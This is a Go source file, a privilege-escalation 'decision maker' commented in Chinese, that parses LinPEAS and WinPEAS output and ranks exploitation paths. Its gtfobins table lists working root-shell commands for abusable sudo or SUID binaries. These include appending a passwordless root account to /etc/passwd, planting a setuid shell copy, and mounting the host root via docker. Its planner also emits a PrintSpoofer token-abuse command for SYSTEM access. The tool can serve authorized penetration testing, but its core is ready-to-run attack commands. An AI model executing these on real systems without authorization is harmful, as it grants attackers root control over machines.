// Package privesc 是「提权决策器」：把枚举输出（LinPEAS/WinPEAS/manual）
// 变成 3 条可执行路径，并按成功率/风险排序。
//
// 纪律：只输出**只读枚举 → 最小验证**的命令；内核漏洞默认排在最后（易崩）。
package privesc

import (
	"regexp"
	"sort"
	"strings"
)

// FindingKind 是枚举发现类型。
type FindingKind string

const (
	KindSudo     FindingKind = "sudo"
	KindSUID     FindingKind = "suid"
	KindCap      FindingKind = "cap"
	KindWritable FindingKind = "writable"
	KindCron     FindingKind = "cron"
	KindService  FindingKind = "service"
	KindKernel   FindingKind = "kernel"
	KindToken    FindingKind = "token" // Windows SeImpersonate 等
)

// Finding 是一条枚举发现。
type Finding struct {
	Kind   FindingKind `json:"kind"`
	Detail string      `json:"detail"` // 原始行
	Binary string      `json:"binary,omitempty"`
	Path   string      `json:"path,omitempty"`
}

// Path 是一条可执行提权路径。
type Path struct {
	Name  string `json:"name"`
	Cmd   string `json:"cmd"`
	Why   string `json:"why"`
	Risk  string `json:"risk"`  // low|medium|high
	Score int    `json:"score"` // 越大越先做
}

// gtfobins 是常见 SUID/sudo 可滥用二进制 → 提权命令。
var gtfobins = map[string]string{
	"nmap":      `nmap --interactive` + "\n" + `!sh`,
	"vim":       `vim -c ':!/bin/sh'`,
	"vi":        `vi -c ':!/bin/sh'`,
	"find":      `find . -exec /bin/sh -p \; -quit`,
	"bash":      `bash -p`,
	"sh":        `sh -p`,
	"python":    `python -c 'import os; os.setuid(0); os.system("/bin/sh")'`,
	"python3":   `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`,
	"perl":      `perl -e 'exec "/bin/sh";'`,
	"ruby":      `ruby -e 'exec "/bin/sh"'`,
	"tar":       `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`,
	"awk":       `awk 'BEGIN {system("/bin/sh")}'`,
	"less":      `less /etc/passwd` + "\n" + `!/bin/sh`,
	"more":      `more /etc/passwd` + "\n" + `!/bin/sh`,
	"tee":       `echo 'root2::0:0:root:/root:/bin/sh' | tee -a /etc/passwd`,
	"cp":        `cp /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p`,
	"env":       `env /bin/sh -p`,
	"systemctl": `systemctl link /tmp/x.service`,
	"docker":    `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`,
	"pkexec":    `pkexec /bin/sh`,
	"gcc":       `gcc -wrapper /bin/sh,-s .`,
	"make":      `make -s --eval=$'x:\n\t-/bin/sh'`,
	"node":      `node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'`,
	"lua":       `lua -e 'os.execute("/bin/sh")'`,
}

// FromLinPEAS 从 LinPEAS 输出里抽发现（只看关键行，不做完整解析）。
func FromLinPEAS(out string) []Finding {
	var fs []Finding
	// 三种 SUID 写法：ls 行（-rws）、显式 SUID 标注、以及 "SUID" 后面跟路径。
	suidRe := regexp.MustCompile(`(?i)^-rws[\w-]{6}\s+.*?(/[\w./-]+)`)
	suidAlt := regexp.MustCompile(`(?i)SUID[^
]*?(/[\w./-]+)`)
	sudoRe := regexp.MustCompile(`(?i)\(root\)\s*(?:NOPASSWD:\s*)?(/[\w./-]+|[\w.-]+)`)
	capRe := regexp.MustCompile(`(?i)(/[\w./-]+)\s*=?\s*cap_(setuid|setgid|sys_admin|dac_read_search|dac_override)`)
	capAlt := regexp.MustCompile(`(?i)cap_(setuid|setgid|sys_admin|dac_read_search|dac_override)[^
]*?(/[\w./-]+)`)
	writableRe := regexp.MustCompile(`(?i)(writable|可写).*?(/[\w./-]+)`)
	kernelRe := regexp.MustCompile(`(?i)(?:linux|kernel|内核|uname)[^\d
]*(\d+\.\d+\.\d+[\w.-]*)`)

	for _, line := range strings.Split(out, "\n") {
		l := strings.TrimSpace(line)
		if l == "" {
			continue
		}
		if m := suidRe.FindStringSubmatch(l); m != nil {
			fs = append(fs, Finding{Kind: KindSUID, Detail: l, Binary: base(m[1]), Path: m[1]})
			continue
		}
		if m := suidAlt.FindStringSubmatch(l); m != nil {
			fs = append(fs, Finding{Kind: KindSUID, Detail: l, Binary: base(m[1]), Path: m[1]})
			continue
		}
		if m := sudoRe.FindStringSubmatch(l); m != nil {
			fs = append(fs, Finding{Kind: KindSudo, Detail: l, Binary: base(m[1]), Path: m[1]})
			continue
		}
		if m := capRe.FindStringSubmatch(l); m != nil {
			fs = append(fs, Finding{Kind: KindCap, Detail: l, Binary: base(m[1]), Path: m[1]})
			continue
		}
		if m := capAlt.FindStringSubmatch(l); m != nil {
			fs = append(fs, Finding{Kind: KindCap, Detail: l, Binary: base(m[2]), Path: m[2]})
			continue
		}
		if m := kernelRe.FindStringSubmatch(l); m != nil {
			fs = append(fs, Finding{Kind: KindKernel, Detail: l, Path: m[1]})
			continue
		}
		if m := writableRe.FindStringSubmatch(l); m != nil && strings.Contains(l, "/") {
			fs = append(fs, Finding{Kind: KindWritable, Detail: l, Path: m[2]})
		}
	}
	return fs
}

// FromWindows 从 WinPEAS/手工枚举里抽 Windows 提权发现。
func FromWindows(out string) []Finding {
	var fs []Finding
	rules := []struct {
		kind FindingKind
		kws  []string
	}{
		{KindToken, []string{"seimpersonate", "seloaddriver", "seassignprimarytoken", "sedebug"}},
		{KindService, []string{"unquoted service path", "可写服务", "writable service", "modifiable service"}},
		{KindWritable, []string{"alwaysinstallelevated", "可写目录", "writable path", "users have write"}},
	}
	for _, line := range strings.Split(out, "\n") {
		l := strings.TrimSpace(line)
		if l == "" {
			continue
		}
		low := strings.ToLower(l)
		for _, r := range rules {
			hit := false
			for _, kw := range r.kws {
				if strings.Contains(low, kw) {
					hit = true
					break
				}
			}
			if hit {
				fs = append(fs, Finding{Kind: r.kind, Detail: l})
				break
			}
		}
	}
	return fs
}

// Plan 把发现排成可执行路径（最多返回 limit 条，默认 3）。
func Plan(findings []Finding, osName string, limit int) []Path {
	if limit <= 0 {
		limit = 3
	}
	windows := strings.Contains(strings.ToLower(osName), "win")
	var out []Path
	seen := map[string]bool{}
	push := func(p Path) {
		key := p.Name + "|" + p.Cmd
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, p)
	}

	for _, f := range findings {
		switch f.Kind {
		case KindSudo:
			if cmd, ok := gtfobins[strings.ToLower(f.Binary)]; ok {
				push(Path{Name: "sudo " + f.Binary, Cmd: "sudo " + f.Binary + "\n" + cmd,
					Why: "该二进制可 sudo 执行（" + f.Detail + "）", Risk: "low", Score: 90})
			} else if f.Path != "" {
				push(Path{Name: "sudo 直通", Cmd: "sudo " + f.Path,
					Why: "sudo 规则允许直接执行该路径", Risk: "low", Score: 80})
			}
		case KindSUID:
			if cmd, ok := gtfobins[strings.ToLower(f.Binary)]; ok {
				push(Path{Name: "SUID " + f.Binary, Cmd: f.Path + "\n" + cmd,
					Why: "SUID 位 + 可滥用二进制（GTFOBins）", Risk: "low", Score: 95})
			}
		case KindCap:
			push(Path{Name: "capability 提权", Cmd: "getcap -r / 2>/dev/null | grep -E 'cap_(setuid|sys_admin)'\n" + f.Path,
				Why: "该文件带可提权 capability", Risk: "medium", Score: 85})
		case KindWritable:
			if windows {
				push(Path{Name: "可写路径/服务劫持", Cmd: "icacls \"" + f.Path + "\"",
					Why: "服务或安装路径可写，可替换二进制提权", Risk: "medium", Score: 70})
			} else {
				push(Path{Name: "可写文件/服务", Cmd: "ls -l " + f.Path,
					Why: "可写脚本/服务配置可注入命令", Risk: "medium", Score: 70})
			}
		case KindCron: // Windows 服务等价
			push(Path{Name: "计划任务/服务注入", Cmd: f.Detail, Why: "定时/服务以高权限运行可写脚本", Risk: "medium", Score: 65})
		case KindService:
			push(Path{Name: "Windows 服务/令牌", Cmd: "whoami /priv\nsc qc <服务名>",
				Why: "存在可滥用的服务权限或令牌特权", Risk: "medium", Score: 75})
		case KindToken:
			push(Path{Name: "令牌窃取（SeImpersonate）", Cmd: "whoami /priv\nPrintSpoofer.exe -i -c cmd",
				Why: "持有 SeImpersonate/SeAssignPrimaryToken，可提权到 SYSTEM", Risk: "low", Score: 88})
		case KindKernel:
			push(Path{Name: "内核漏洞（最后再试）", Cmd: "uname -a\nsearchsploit " + f.Path,
				Why: "内核版本可能对应已知提权 CVE；先确认补丁状态", Risk: "high", Score: 30})
		}
	}
	// 兜底：没有可用发现时给出通用枚举路径（仍然可执行）。
	if len(out) == 0 {
		if windows {
			push(Path{Name: "Windows 通用枚举", Cmd: "whoami /priv\nwhoami /groups\nsc query state= all",
				Why: "先看令牌特权与服务配置，再决定路径", Risk: "low", Score: 20})
		} else {
			push(Path{Name: "Linux 通用枚举", Cmd: "sudo -n -l 2>/dev/null\nfind / -perm -4000 -type f 2>/dev/null | head -50",
				Why: "先看 sudo 规则与 SUID 清单，再决定路径", Risk: "low", Score: 20})
		}
	}
	sort.SliceStable(out, func(i, j int) bool { return out[i].Score > out[j].Score })
	if len(out) > limit {
		out = out[:limit]
	}
	return out
}

func base(p string) string {
	p = strings.TrimSpace(p)
	if i := strings.LastIndex(p, "/"); i >= 0 {
		return p[i+1:]
	}
	return p
}
